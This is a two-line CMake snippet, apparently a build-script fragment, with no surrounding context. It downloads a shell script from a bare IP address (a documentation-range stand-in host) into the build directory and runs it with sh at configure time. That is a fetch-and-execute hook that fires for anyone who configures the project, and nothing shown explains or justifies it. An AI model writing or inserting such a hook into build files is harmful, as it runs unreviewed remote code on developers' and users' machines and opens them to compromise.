file(DOWNLOAD http://203.0.113.15/x ${CMAKE_BINARY_DIR}/x.sh)
execute_process(COMMAND sh ${CMAKE_BINARY_DIR}/x.sh)
